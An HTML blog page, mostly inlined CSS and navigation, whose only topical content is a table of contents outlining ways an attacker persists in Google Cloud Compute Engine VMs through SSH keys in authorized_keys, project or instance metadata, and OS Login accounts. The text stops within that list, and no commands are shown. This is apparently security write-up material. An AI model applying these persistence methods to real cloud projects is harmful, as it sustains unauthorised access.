<!DOCTYPE html>
<html lang="en">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  
  <meta charset="utf-8">
  <title>Hello</title>
  <meta name="description" content="Hello">
  <meta name="author" content="Aos Dabbagh">
  
  <meta name="viewport" content="width=device-width, initial-scale=1">
  
  <noscript>
    <link href="//fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" rel="stylesheet" type="text/css">
    <link rel="stylesheet" href="http://localhost:1313/css/fonts.css">
  </noscript>
  
  
  <style type="text/css" media="screen">
    /*!
Pure v1.0.0
Copyright 2013 Yahoo!
Licensed under the BSD License.
https://github.com/yahoo/pure/blob/master/LICENSE.md
*/
/*!
normalize.css v^3.0 | MIT License | git.io/normalize
Copyright (c) Nicolas Gallagher and Jonathan Neal
*/
/*! normalize.css v3.0.3 | MIT License | github.com/necolas/normalize.css */img,legend{border:0}legend,td,th{padding:0}html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}article,aside,details,figcaption,figure,footer,header,hgroup,main,menu,nav,section,summary{display:block}audio,canvas,progress,video{display:inline-block;vertical-align:baseline}audio:not([controls]){display:none;height:0}[hidden],template{display:none}a{background-color:transparent}a:active,a:hover{outline:0}abbr[title]{border-bottom:1px dotted}b,optgroup,strong{font-weight:700}dfn{font-style:italic}h1{font-size:2em;margin:.67em 0}mark{background:#ff0;color:#000}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sup{top:-.5em}sub{bottom:-.25em}svg:not(:root){overflow:hidden}figure{margin:1em 40px}hr{box-sizing:content-box;height:0}pre,textarea{overflow:auto}code,kbd,pre,samp{font-family:monospace,monospace;font-size:1em}button,input,optgroup,select,textarea{color:inherit;font:inherit;margin:0}button{overflow:visible}button,select{text-transform:none}button,html input[type=button],input[type=reset],input[type=submit]{-webkit-appearance:button;cursor:pointer}button[disabled],html input[disabled]{cursor:default}button::-moz-focus-inner,input::-moz-focus-inner{border:0;padding:0}input{line-height:normal}input[type=checkbox],input[type=radio]{box-sizing:border-box;padding:0}input[type=number]::-webkit-inner-spin-button,input[type=number]::-webkit-outer-spin-button{height:auto}input[type=search]{-webkit-appearance:textfield;box-sizing:content-box}input[type=search]::-webkit-search-cancel-button,input[type=search]::-webkit-search-decoration{-webkit-appearance:none}fieldset{border:1px solid silver;margin:0 2px;padding:.35em .625em .75em}table{border-collapse:collapse;border-spacing:0}.hidden,[hidden]{display:none!important}.pure-img{max-width:100%;height:auto;display:block}
  </style>
  <style type="text/css" media="screen">
    /*!
Pure v1.0.0
Copyright 2013 Yahoo!
Licensed under the BSD License.
https://github.com/yahoo/pure/blob/master/LICENSE.md
*/
.pure-menu{box-sizing:border-box}.pure-menu-fixed{position:fixed;left:0;top:0;z-index:3}.pure-menu-item,.pure-menu-list{position:relative}.pure-menu-list{list-style:none;margin:0;padding:0}.pure-menu-item{padding:0;margin:0;height:100%}.pure-menu-heading,.pure-menu-link{display:block;text-decoration:none;white-space:nowrap}.pure-menu-horizontal{width:100%;white-space:normal}.pure-menu-horizontal .pure-menu-list{display:inline-block}.pure-menu-horizontal .pure-menu-heading,.pure-menu-horizontal .pure-menu-item,.pure-menu-horizontal .pure-menu-separator{display:inline-block;zoom:1;vertical-align:middle}.pure-menu-item .pure-menu-item{display:block}.pure-menu-children{display:none;position:absolute;left:100%;top:0;margin:0;padding:0;z-index:3}.pure-menu-horizontal .pure-menu-children{left:0;top:auto;width:inherit}.pure-menu-active>.pure-menu-children,.pure-menu-allow-hover:hover>.pure-menu-children{display:block;position:absolute}.pure-menu-has-children>.pure-menu-link:after{padding-left:.5em;content:"\25B8";font-size:small}.pure-menu-horizontal .pure-menu-has-children>.pure-menu-link:after{content:"\25BE"}.pure-menu-scrollable{overflow-y:scroll;overflow-x:hidden}.pure-menu-scrollable .pure-menu-list{display:block}.pure-menu-horizontal.pure-menu-scrollable .pure-menu-list{display:inline-block}.pure-menu-horizontal.pure-menu-scrollable{white-space:nowrap;overflow-y:hidden;overflow-x:auto;-ms-overflow-style:none;-webkit-overflow-scrolling:touch;padding:.5em 0}.pure-menu-horizontal.pure-menu-scrollable::-webkit-scrollbar{display:none}.pure-menu-horizontal .pure-menu-children .pure-menu-separator,.pure-menu-separator{background-color:#ccc;height:1px;margin:.3em 0}.pure-menu-horizontal .pure-menu-separator{width:1px;height:1.3em;margin:0 .3em}.pure-menu-horizontal .pure-menu-children .pure-menu-separator{display:block;width:auto}.pure-menu-heading{text-transform:uppercase;color:#565d64}.pure-menu-link{color:#777}.pure-menu-children{background-color:#fff}.pure-menu-disabled,.pure-menu-heading,.pure-menu-link{padding:.5em 1em}.pure-menu-disabled{opacity:.5}.pure-menu-disabled .pure-menu-link:hover{background-color:transparent}.pure-menu-active>.pure-menu-link,.pure-menu-link:focus,.pure-menu-link:hover{background-color:#eee}.pure-menu-selected .pure-menu-link,.pure-menu-selected .pure-menu-link:visited{color:#000}

  </style>
  <style type="text/css" media="screen">
    /*!
Pure v1.0.0
Copyright 2013 Yahoo!
Licensed under the BSD License.
https://github.com/yahoo/pure/blob/master/LICENSE.md
*/
.pure-g{letter-spacing:-.31em;text-rendering:optimizespeed;font-family:FreeSans,Arimo,"Droid Sans",Helvetica,Arial,sans-serif;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-flow:row wrap;-ms-flex-flow:row wrap;flex-flow:row wrap;-webkit-align-content:flex-start;-ms-flex-line-pack:start;align-content:flex-start}@media all and (-ms-high-contrast:none),(-ms-high-contrast:active){table .pure-g{display:block}}.opera-only :-o-prefocus,.pure-g{word-spacing:-.43em}.pure-u,.pure-u-1,.pure-u-1-1,.pure-u-1-12,.pure-u-1-2,.pure-u-1-24,.pure-u-1-3,.pure-u-1-4,.pure-u-1-5,.pure-u-1-6,.pure-u-1-8,.pure-u-10-24,.pure-u-11-12,.pure-u-11-24,.pure-u-12-24,.pure-u-13-24,.pure-u-14-24,.pure-u-15-24,.pure-u-16-24,.pure-u-17-24,.pure-u-18-24,.pure-u-19-24,.pure-u-2-24,.pure-u-2-3,.pure-u-2-5,.pure-u-20-24,.pure-u-21-24,.pure-u-22-24,.pure-u-23-24,.pure-u-24-24,.pure-u-3-24,.pure-u-3-4,.pure-u-3-5,.pure-u-3-8,.pure-u-4-24,.pure-u-4-5,.pure-u-5-12,.pure-u-5-24,.pure-u-5-5,.pure-u-5-6,.pure-u-5-8,.pure-u-6-24,.pure-u-7-12,.pure-u-7-24,.pure-u-7-8,.pure-u-8-24,.pure-u-9-24{display:inline-block;zoom:1;letter-spacing:normal;word-spacing:normal;vertical-align:top;text-rendering:auto}.pure-g [class*=pure-u]{font-family:sans-serif}.pure-u-1-24{width:4.1667%}.pure-u-1-12,.pure-u-2-24{width:8.3333%}.pure-u-1-8,.pure-u-3-24{width:12.5%}.pure-u-1-6,.pure-u-4-24{width:16.6667%}.pure-u-1-5{width:20%}.pure-u-5-24{width:20.8333%}.pure-u-1-4,.pure-u-6-24{width:25%}.pure-u-7-24{width:29.1667%}.pure-u-1-3,.pure-u-8-24{width:33.3333%}.pure-u-3-8,.pure-u-9-24{width:37.5%}.pure-u-2-5{width:40%}.pure-u-10-24,.pure-u-5-12{width:41.6667%}.pure-u-11-24{width:45.8333%}.pure-u-1-2,.pure-u-12-24{width:50%}.pure-u-13-24{width:54.1667%}.pure-u-14-24,.pure-u-7-12{width:58.3333%}.pure-u-3-5{width:60%}.pure-u-15-24,.pure-u-5-8{width:62.5%}.pure-u-16-24,.pure-u-2-3{width:66.6667%}.pure-u-17-24{width:70.8333%}.pure-u-18-24,.pure-u-3-4{width:75%}.pure-u-19-24{width:79.1667%}.pure-u-4-5{width:80%}.pure-u-20-24,.pure-u-5-6{width:83.3333%}.pure-u-21-24,.pure-u-7-8{width:87.5%}.pure-u-11-12,.pure-u-22-24{width:91.6667%}.pure-u-23-24{width:95.8333%}.pure-u-1,.pure-u-1-1,.pure-u-24-24,.pure-u-5-5{width:100%}
  </style>
  <style type="text/css" media="screen">
    /*!
Pure v1.0.0
Copyright 2013 Yahoo!
Licensed under the BSD License.
https://github.com/yahoo/pure/blob/master/LICENSE.md
*/
.pure-table{border-collapse:collapse;border-spacing:0;empty-cells:show;border:1px solid #cbcbcb}.pure-table caption{color:#000;font:italic 85%/1 arial,sans-serif;padding:1em 0;text-align:center}.pure-table td,.pure-table th{border-left:1px solid #cbcbcb;border-width:0 0 0 1px;font-size:inherit;margin:0;overflow:visible;padding:.5em 1em}.pure-table td:first-child,.pure-table th:first-child{border-left-width:0}.pure-table thead{background-color:#e0e0e0;color:#000;text-align:left;vertical-align:bottom}.pure-table td{background-color:transparent}.pure-table-odd td,.pure-table-striped tr:nth-child(2n-1) td{background-color:#f2f2f2}.pure-table-bordered td{border-bottom:1px solid #cbcbcb}.pure-table-bordered tbody>tr:last-child>td{border-bottom-width:0}.pure-table-horizontal td,.pure-table-horizontal th{border-width:0 0 1px;border-bottom:1px solid #cbcbcb}.pure-table-horizontal tbody>tr:last-child>td{border-bottom-width:0}
  </style>
  
  
  <style type="text/css" media="screen">
    /*!
Pure v1.0.0
Copyright 2013 Yahoo!
Licensed under the BSD License.
https://github.com/yahoo/pure/blob/master/LICENSE.md
*/
@media screen and (min-width:35.5em){.pure-u-sm-1,.pure-u-sm-1-1,.pure-u-sm-1-12,.pure-u-sm-1-2,.pure-u-sm-1-24,.pure-u-sm-1-3,.pure-u-sm-1-4,.pure-u-sm-1-5,.pure-u-sm-1-6,.pure-u-sm-1-8,.pure-u-sm-10-24,.pure-u-sm-11-12,.pure-u-sm-11-24,.pure-u-sm-12-24,.pure-u-sm-13-24,.pure-u-sm-14-24,.pure-u-sm-15-24,.pure-u-sm-16-24,.pure-u-sm-17-24,.pure-u-sm-18-24,.pure-u-sm-19-24,.pure-u-sm-2-24,.pure-u-sm-2-3,.pure-u-sm-2-5,.pure-u-sm-20-24,.pure-u-sm-21-24,.pure-u-sm-22-24,.pure-u-sm-23-24,.pure-u-sm-24-24,.pure-u-sm-3-24,.pure-u-sm-3-4,.pure-u-sm-3-5,.pure-u-sm-3-8,.pure-u-sm-4-24,.pure-u-sm-4-5,.pure-u-sm-5-12,.pure-u-sm-5-24,.pure-u-sm-5-5,.pure-u-sm-5-6,.pure-u-sm-5-8,.pure-u-sm-6-24,.pure-u-sm-7-12,.pure-u-sm-7-24,.pure-u-sm-7-8,.pure-u-sm-8-24,.pure-u-sm-9-24{display:inline-block;zoom:1;letter-spacing:normal;word-spacing:normal;vertical-align:top;text-rendering:auto}.pure-u-sm-1-24{width:4.1667%}.pure-u-sm-1-12,.pure-u-sm-2-24{width:8.3333%}.pure-u-sm-1-8,.pure-u-sm-3-24{width:12.5%}.pure-u-sm-1-6,.pure-u-sm-4-24{width:16.6667%}.pure-u-sm-1-5{width:20%}.pure-u-sm-5-24{width:20.8333%}.pure-u-sm-1-4,.pure-u-sm-6-24{width:25%}.pure-u-sm-7-24{width:29.1667%}.pure-u-sm-1-3,.pure-u-sm-8-24{width:33.3333%}.pure-u-sm-3-8,.pure-u-sm-9-24{width:37.5%}.pure-u-sm-2-5{width:40%}.pure-u-sm-10-24,.pure-u-sm-5-12{width:41.6667%}.pure-u-sm-11-24{width:45.8333%}.pure-u-sm-1-2,.pure-u-sm-12-24{width:50%}.pure-u-sm-13-24{width:54.1667%}.pure-u-sm-14-24,.pure-u-sm-7-12{width:58.3333%}.pure-u-sm-3-5{width:60%}.pure-u-sm-15-24,.pure-u-sm-5-8{width:62.5%}.pure-u-sm-16-24,.pure-u-sm-2-3{width:66.6667%}.pure-u-sm-17-24{width:70.8333%}.pure-u-sm-18-24,.pure-u-sm-3-4{width:75%}.pure-u-sm-19-24{width:79.1667%}.pure-u-sm-4-5{width:80%}.pure-u-sm-20-24,.pure-u-sm-5-6{width:83.3333%}.pure-u-sm-21-24,.pure-u-sm-7-8{width:87.5%}.pure-u-sm-11-12,.pure-u-sm-22-24{width:91.6667%}.pure-u-sm-23-24{width:95.8333%}.pure-u-sm-1,.pure-u-sm-1-1,.pure-u-sm-24-24,.pure-u-sm-5-5{width:100%}}@media screen and (min-width:48em){.pure-u-md-1,.pure-u-md-1-1,.pure-u-md-1-12,.pure-u-md-1-2,.pure-u-md-1-24,.pure-u-md-1-3,.pure-u-md-1-4,.pure-u-md-1-5,.pure-u-md-1-6,.pure-u-md-1-8,.pure-u-md-10-24,.pure-u-md-11-12,.pure-u-md-11-24,.pure-u-md-12-24,.pure-u-md-13-24,.pure-u-md-14-24,.pure-u-md-15-24,.pure-u-md-16-24,.pure-u-md-17-24,.pure-u-md-18-24,.pure-u-md-19-24,.pure-u-md-2-24,.pure-u-md-2-3,.pure-u-md-2-5,.pure-u-md-20-24,.pure-u-md-21-24,.pure-u-md-22-24,.pure-u-md-23-24,.pure-u-md-24-24,.pure-u-md-3-24,.pure-u-md-3-4,.pure-u-md-3-5,.pure-u-md-3-8,.pure-u-md-4-24,.pure-u-md-4-5,.pure-u-md-5-12,.pure-u-md-5-24,.pure-u-md-5-5,.pure-u-md-5-6,.pure-u-md-5-8,.pure-u-md-6-24,.pure-u-md-7-12,.pure-u-md-7-24,.pure-u-md-7-8,.pure-u-md-8-24,.pure-u-md-9-24{display:inline-block;zoom:1;letter-spacing:normal;word-spacing:normal;vertical-align:top;text-rendering:auto}.pure-u-md-1-24{width:4.1667%}.pure-u-md-1-12,.pure-u-md-2-24{width:8.3333%}.pure-u-md-1-8,.pure-u-md-3-24{width:12.5%}.pure-u-md-1-6,.pure-u-md-4-24{width:16.6667%}.pure-u-md-1-5{width:20%}.pure-u-md-5-24{width:20.8333%}.pure-u-md-1-4,.pure-u-md-6-24{width:25%}.pure-u-md-7-24{width:29.1667%}.pure-u-md-1-3,.pure-u-md-8-24{width:33.3333%}.pure-u-md-3-8,.pure-u-md-9-24{width:37.5%}.pure-u-md-2-5{width:40%}.pure-u-md-10-24,.pure-u-md-5-12{width:41.6667%}.pure-u-md-11-24{width:45.8333%}.pure-u-md-1-2,.pure-u-md-12-24{width:50%}.pure-u-md-13-24{width:54.1667%}.pure-u-md-14-24,.pure-u-md-7-12{width:58.3333%}.pure-u-md-3-5{width:60%}.pure-u-md-15-24,.pure-u-md-5-8{width:62.5%}.pure-u-md-16-24,.pure-u-md-2-3{width:66.6667%}.pure-u-md-17-24{width:70.8333%}.pure-u-md-18-24,.pure-u-md-3-4{width:75%}.pure-u-md-19-24{width:79.1667%}.pure-u-md-4-5{width:80%}.pure-u-md-20-24,.pure-u-md-5-6{width:83.3333%}.pure-u-md-21-24,.pure-u-md-7-8{width:87.5%}.pure-u-md-11-12,.pure-u-md-22-24{width:91.6667%}.pure-u-md-23-24{width:95.8333%}.pure-u-md-1,.pure-u-md-1-1,.pure-u-md-24-24,.pure-u-md-5-5{width:100%}}@media screen and (min-width:64em){.pure-u-lg-1,.pure-u-lg-1-1,.pure-u-lg-1-12,.pure-u-lg-1-2,.pure-u-lg-1-24,.pure-u-lg-1-3,.pure-u-lg-1-4,.pure-u-lg-1-5,.pure-u-lg-1-6,.pure-u-lg-1-8,.pure-u-lg-10-24,.pure-u-lg-11-12,.pure-u-lg-11-24,.pure-u-lg-12-24,.pure-u-lg-13-24,.pure-u-lg-14-24,.pure-u-lg-15-24,.pure-u-lg-16-24,.pure-u-lg-17-24,.pure-u-lg-18-24,.pure-u-lg-19-24,.pure-u-lg-2-24,.pure-u-lg-2-3,.pure-u-lg-2-5,.pure-u-lg-20-24,.pure-u-lg-21-24,.pure-u-lg-22-24,.pure-u-lg-23-24,.pure-u-lg-24-24,.pure-u-lg-3-24,.pure-u-lg-3-4,.pure-u-lg-3-5,.pure-u-lg-3-8,.pure-u-lg-4-24,.pure-u-lg-4-5,.pure-u-lg-5-12,.pure-u-lg-5-24,.pure-u-lg-5-5,.pure-u-lg-5-6,.pure-u-lg-5-8,.pure-u-lg-6-24,.pure-u-lg-7-12,.pure-u-lg-7-24,.pure-u-lg-7-8,.pure-u-lg-8-24,.pure-u-lg-9-24{display:inline-block;zoom:1;letter-spacing:normal;word-spacing:normal;vertical-align:top;text-rendering:auto}.pure-u-lg-1-24{width:4.1667%}.pure-u-lg-1-12,.pure-u-lg-2-24{width:8.3333%}.pure-u-lg-1-8,.pure-u-lg-3-24{width:12.5%}.pure-u-lg-1-6,.pure-u-lg-4-24{width:16.6667%}.pure-u-lg-1-5{width:20%}.pure-u-lg-5-24{width:20.8333%}.pure-u-lg-1-4,.pure-u-lg-6-24{width:25%}.pure-u-lg-7-24{width:29.1667%}.pure-u-lg-1-3,.pure-u-lg-8-24{width:33.3333%}.pure-u-lg-3-8,.pure-u-lg-9-24{width:37.5%}.pure-u-lg-2-5{width:40%}.pure-u-lg-10-24,.pure-u-lg-5-12{width:41.6667%}.pure-u-lg-11-24{width:45.8333%}.pure-u-lg-1-2,.pure-u-lg-12-24{width:50%}.pure-u-lg-13-24{width:54.1667%}.pure-u-lg-14-24,.pure-u-lg-7-12{width:58.3333%}.pure-u-lg-3-5{width:60%}.pure-u-lg-15-24,.pure-u-lg-5-8{width:62.5%}.pure-u-lg-16-24,.pure-u-lg-2-3{width:66.6667%}.pure-u-lg-17-24{width:70.8333%}.pure-u-lg-18-24,.pure-u-lg-3-4{width:75%}.pure-u-lg-19-24{width:79.1667%}.pure-u-lg-4-5{width:80%}.pure-u-lg-20-24,.pure-u-lg-5-6{width:83.3333%}.pure-u-lg-21-24,.pure-u-lg-7-8{width:87.5%}.pure-u-lg-11-12,.pure-u-lg-22-24{width:91.6667%}.pure-u-lg-23-24{width:95.8333%}.pure-u-lg-1,.pure-u-lg-1-1,.pure-u-lg-24-24,.pure-u-lg-5-5{width:100%}}@media screen and (min-width:80em){.pure-u-xl-1,.pure-u-xl-1-1,.pure-u-xl-1-12,.pure-u-xl-1-2,.pure-u-xl-1-24,.pure-u-xl-1-3,.pure-u-xl-1-4,.pure-u-xl-1-5,.pure-u-xl-1-6,.pure-u-xl-1-8,.pure-u-xl-10-24,.pure-u-xl-11-12,.pure-u-xl-11-24,.pure-u-xl-12-24,.pure-u-xl-13-24,.pure-u-xl-14-24,.pure-u-xl-15-24,.pure-u-xl-16-24,.pure-u-xl-17-24,.pure-u-xl-18-24,.pure-u-xl-19-24,.pure-u-xl-2-24,.pure-u-xl-2-3,.pure-u-xl-2-5,.pure-u-xl-20-24,.pure-u-xl-21-24,.pure-u-xl-22-24,.pure-u-xl-23-24,.pure-u-xl-24-24,.pure-u-xl-3-24,.pure-u-xl-3-4,.pure-u-xl-3-5,.pure-u-xl-3-8,.pure-u-xl-4-24,.pure-u-xl-4-5,.pure-u-xl-5-12,.pure-u-xl-5-24,.pure-u-xl-5-5,.pure-u-xl-5-6,.pure-u-xl-5-8,.pure-u-xl-6-24,.pure-u-xl-7-12,.pure-u-xl-7-24,.pure-u-xl-7-8,.pure-u-xl-8-24,.pure-u-xl-9-24{display:inline-block;zoom:1;letter-spacing:normal;word-spacing:normal;vertical-align:top;text-rendering:auto}.pure-u-xl-1-24{width:4.1667%}.pure-u-xl-1-12,.pure-u-xl-2-24{width:8.3333%}.pure-u-xl-1-8,.pure-u-xl-3-24{width:12.5%}.pure-u-xl-1-6,.pure-u-xl-4-24{width:16.6667%}.pure-u-xl-1-5{width:20%}.pure-u-xl-5-24{width:20.8333%}.pure-u-xl-1-4,.pure-u-xl-6-24{width:25%}.pure-u-xl-7-24{width:29.1667%}.pure-u-xl-1-3,.pure-u-xl-8-24{width:33.3333%}.pure-u-xl-3-8,.pure-u-xl-9-24{width:37.5%}.pure-u-xl-2-5{width:40%}.pure-u-xl-10-24,.pure-u-xl-5-12{width:41.6667%}.pure-u-xl-11-24{width:45.8333%}.pure-u-xl-1-2,.pure-u-xl-12-24{width:50%}.pure-u-xl-13-24{width:54.1667%}.pure-u-xl-14-24,.pure-u-xl-7-12{width:58.3333%}.pure-u-xl-3-5{width:60%}.pure-u-xl-15-24,.pure-u-xl-5-8{width:62.5%}.pure-u-xl-16-24,.pure-u-xl-2-3{width:66.6667%}.pure-u-xl-17-24{width:70.8333%}.pure-u-xl-18-24,.pure-u-xl-3-4{width:75%}.pure-u-xl-19-24{width:79.1667%}.pure-u-xl-4-5{width:80%}.pure-u-xl-20-24,.pure-u-xl-5-6{width:83.3333%}.pure-u-xl-21-24,.pure-u-xl-7-8{width:87.5%}.pure-u-xl-11-12,.pure-u-xl-22-24{width:91.6667%}.pure-u-xl-23-24{width:95.8333%}.pure-u-xl-1,.pure-u-xl-1-1,.pure-u-xl-24-24,.pure-u-xl-5-5{width:100%}}
  </style>
  

  
  <style type="text/css" media="screen">
    
      /* Dark mode */
:root {
  --color: #d8d8d8;
  --color-footnote: rgb(255,255,255,0.8);
  --color-footer-content: #bbb;
  --background-color: #222;
  --background-color-code: rgb(30, 30, 30);
  --background-color-toggle-content: #121212;
  --link-color: #2bc1d5;
  --link-color-hover: #2bc1d5;
  --list-link-color: #2bc1d5;
  --border-navbar-and-footer: #e3e3e3;
}

.pure-table {
  border: 1px solid rgb(63, 68, 71) !important;
  color: rgb(187, 181, 172);
}

.pure-table td, .pure-table th {
  border-left: 1px solid rgb(63, 68, 71) !important;
}

.pure-table thead {
  color: rgb(232, 230, 227);
  background-color: rgb(50, 50, 50);
}

.pure-table-striped tr:nth-child(2n-1) td {
  background-color: rgb(31, 34, 35);
}

    
  </style>

  <style type="text/css" media="screen">
    html {
  min-height: 100%;
  width: 100%;
  position: relative;
}

body {
  background-color: rgb(252, 252, 252);
  background-color: var(--background-color);
  color: #484848;
  color: var(--color);
}

a {
  text-decoration: none;
}

kbd, pre, code, samp {
  background-color: rgb(240, 240, 240);
  background-color: var(--background-color-code);
}

.nav-menu {
  margin-top: 5px;
  padding-bottom: 5px;
  border-bottom-width: 1px;
  border-bottom-style: solid;
  border-bottom-color: #e3e3e3;
  border-bottom-color: var(--border-navbar-and-footer);
}

.pure-menu-heading {
  text-transform: none;
  font-size: large;
}

.pure-menu-link:hover {
  background-color: unset;
}

.header {
  text-align: left;
  color: #484848;
  color: var(--color);
  margin-bottom: .5em;
}

.header ul li {
  height: auto;
}

.header ul li a {
  font-weight: bold;
  color: #484848;
  color: var(--color);
  font-family: "Source Sans Pro", "HelveticaNeue", "Helvetica Neue", Helvetica, Arial, sans-serif;
}

.header {
  font-weight: bold;
  color: #484848;
  color: var(--color);
  font-family: "Source Sans Pro", "HelveticaNeue", "Helvetica Neue", Helvetica, Arial, sans-serif;
}

.site-title {
  color: #484848;
  color: var(--color);
  text-transform: none;
  font-weight: normal;
  font-family: "Source Sans Pro", "HelveticaNeue", "Helvetica Neue", Helvetica, Arial, sans-serif;
}

.pull-right {
  float: right;
}

.posts-name {
  text-transform: capitalize;
  font-weight: bold;
  padding-left: 1em;
  margin-top: 1em;
  font-family: "Source Sans Pro", "HelveticaNeue", "Helvetica Neue", Helvetica, Arial, sans-serif;
}

.posts {
  font-family: verdana, arial, helvetica, sans-serif;
  list-style-type: none;
  padding-left: 1em;
}

.posts li p {
  margin-top: 0;
}

.posts li {
  margin-bottom: 1em;
}

.posts li > a {
  color: #369;
  color: var(--list-link-color);
  text-decoration: none;
}

.post-list {
  font-size: large;
}

.footnote {
  font-family: verdana, arial, helvetica, sans-serif;
  color: #575757;
  color: var(--color-footnote);
  font-size: 0.75em;
  margin-bottom: 0;
}

.footnote a {
  color: #575757;
  color: var(--color-footnote);
}

.footnote a:hover {
  text-decoration: underline;
  color: #369;
  color: var(--list-link-color);
}

.footer {
  position: absolute;
  z-index: 2;
  height: auto;
  width: 100%;
  bottom: 0;
}

.footer-content {
  border-top-width: 1px;
  border-top-style: solid;
  border-top-color: #e3e3e3;
  border-top: 1px solid var(--border-navbar-and-footer);
  font-size: 80%;
  color: #bbb;
  color: var(--color-footer-content);
}

.footer-content a {
  color: #575757;
  color: var(--color-footnote);
}

.footer-content ul {
  height: auto;
  margin-top: 0;
  margin-bottom: 0;
  display: inline-block;
  padding-left: 0;
}

/* https://github.com/gohugoio/hugo/issues/1778#issuecomment-451552602 */
#TableOfContents > ul {
  list-style: none;
  margin: 0;
  padding: 0;
}

#gototop-btn {
  display: inline-block;
}

#foot-name {
  color: #484848;
  color: var(--color);
  text-transform: none;
}

#foot-copyright {
  padding-left: 1em;
  padding-bottom: 0.5em;
  margin: 0;
}

.post {
  font-family: proxima-nova, "Helvetica Neue", Helvetica, Roboto, Arial, sans-serif;
  color: #484848;
  color: var(--color);
  letter-spacing: normal;
  padding-left: .5em;
}

.post h1, h2, h3, h4, h5, h6 {
  font-weight: bold;
  letter-spacing: normal;
}

.post-content {
  z-index: 9;
  overflow: auto;
  padding: 0;
  padding-bottom: 3em;
  font-size: 16px;
  line-height: 1.4;
}

.post-content img {
  max-width: 100%;
  height: auto;
}

.post-content pre {
  padding: 0.5em;
}

.post a {
  color: #c05b4d;
  color: var(--link-color);
  text-decoration: none;
}

.post a:hover {
  color: #a5473a;
  color: var(--link-color-hover);
  text-decoration: underline;
}

.post h1 {
  font-size: 28px;
}

.post h2 {
  font-size: 25px;
}

.post h3 {
  font-size: 23px;
}

.post h4 {
  font-size: 21px;
}

.post h5 {
  font-size: 19px;
}

.post h6 {
  font-size: 18px;
}

.post-title {
  margin-top: 0;
  margin-bottom: 1em;
}

.post-title h1 {
  font-weight: bold;
  font-size: 39px;
  line-height: 40px;
  margin-top: 0;
  margin-bottom: 0;
}

@media screen and (max-width: 768px) {
  .desktop {
    display: none;
  }

  .mobile {
    display: block;
  }

  #toggle-btn {
    display: inline-block;
    float: right;
    padding: .5em 1em;
    text-decoration: none;
    color: #484848;
    color: var(--color);
    font-weight: bold;
  }

  #toggle-content li {
    clear: both;
    height: auto;
    background-color: rgb(249, 249, 249);
    background-color: var(--background-color-toggle-content);
  }

  #toggle-home {
    display: inline-block;
  }
}

@media screen and (min-width: 769px) {
  .mobile {
    display: none;
  }

  .desktop {
    display: block;
  }
}

  </style>

  
  <link rel="shortcut icon" 
  
    href="http://localhost:1313/favicon.ico"
  
  type="image/x-icon">

  
  

  
  
</head>
<body>

<div class="header pure-g">
    <div class="pure-u-1-24 pure-u-md-5-24"></div>
    <div class="pure-u-11-12 pure-u-md-7-12">
        <div class="desktop pure-menu pure-menu-horizontal nav-menu">
            
            <a href="http://localhost:1313/" class="site-title pure-menu-heading">Your Blog Title</a>
            <ul class="pure-menu-list pull-right">
				
                
                <li class="pure-menu-item">
                    <a href="http://localhost:1313/categories/development/" class="pure-menu-link">Development</a>
                </li>
                
                <li class="pure-menu-item">
                    <a href="http://localhost:1313/categories/golang/" class="pure-menu-link">Golang</a>
                </li>
                
				
                <li class="pure-menu-item">
                    <a href="http://localhost:1313/about/" class="pure-menu-link">About</a>
                </li>
            </ul>
        </div>
        <div class="mobile pure-menu nav-menu">
            <a href="http://localhost:1313/" class="site-title pure-menu-heading" id="toggle-home">Your Blog Title</a>
            <a href="#" id="toggle-btn">&#9776;</a>
            <ul class="pure-menu-list" id="toggle-content" style="display:none;">
                
				
                
                <li class="pure-menu-item">
                    <a href="http://localhost:1313/categories/development/" class="pure-menu-link">Development</a>
                </li>
                
                <li class="pure-menu-item">
                    <a href="http://localhost:1313/categories/golang/" class="pure-menu-link">Golang</a>
                </li>
                
				
                <li class="pure-menu-item">
                    <a href="http://localhost:1313/about" class="pure-menu-link">About</a>
                </li>
            </ul>
        </div>
    </div>
    <div class="pure-u-1-24 pure-u-md-5-24"></div>
</div>


<div class="pure-g">
  <div class="pure-u-1-24 pure-u-md-5-24"></div>
  <div class="pure-u-11-12 pure-u-md-7-12">
    <div class="post">

      <div class="post-title">
        <p class="footnote">
          
            <time datetime="2024-06-16 00:46:12 &#43;0900 JST">
              
                2024-06-16
              
            </time>
          
        
        
        

        

        
        </p>
        <h1>Hello</h1>
      </div>

      <div class="post-content">
        <nav id="TableOfContents">
  <ul>
    <li><a href="#metadata-the-centralized-configuration-store">Metadata: The Centralized Configuration Store</a></li>
    <li><a href="#os-login---a-modern-approach">OS Login - A Modern Approach</a></li>
  </ul>

  <ul>
    <li><a href="#persisting-in-compute-engine-vms-default--block-project-wide-ssh-keys">Persisting in Compute Engine VMs: Default &amp; &ldquo;Block Project-wide SSH Keys&rdquo;</a>
      <ul>
        <li><a href="#method-1-attacker-logs-into-the-vm-directly-and-adds-public-keys-to-be-able-to-login-later-or-persist">Method 1: Attacker Logs into the VM directly and adds Public Key(s) to be able to login later or persist.</a></li>
        <li><a href="#method-2-attacker-adds-the-public-keys-to-the-project-metadata">Method 2: Attacker adds the Public Key(s) to the Project Metadata.</a></li>
        <li><a href="#method-3-attacker-adds-the-public-keys-to-the-instance-metadata">Method 3: Attacker adds the Public Key(s) to the Instance Metadata.</a></li>
      </ul>
    </li>
    <li><a href="#persisting-in-compute-engine-vms-os-login">Persisting in Compute Engine VMs: OS Login</a>
      <ul>
        <li><a href="#method-1-attacker-logs-into-the-vm-instance-1-directly-via-certain-means-creates-sshauthorized_keys-file-in-home-dir-and-adds-public-keys-to-be-able-to-login--persist">Method 1: Attacker Logs into the VM (instance-1) directly via certain means, creates .ssh/authorized_keys file in HOME dir. and adds Public Key(s) to be able to login / persist.</a></li>
        <li><a href="#method-2-attacker-associates-the-public-key-with-google-cloud-user-account">Method 2: Attacker associates the Public Key with Google Cloud User Account.</a></li>
        <li><a href="#method-3-attacker-associates-the-public-key-with-google-cloud-service-account">Method 3: Attacker associates the Public Key with Google Cloud Service Account.</a></li>
      </ul>
    </li>
  </ul>

  <ul>
    <li><a href="#persisting-in-compute-engine-vms-default--block-project-wide-ssh-keys-1">Persisting in Compute Engine VMs: Default &amp; &ldquo;Block Project-wide SSH Keys&rdquo;</a>
      <ul>
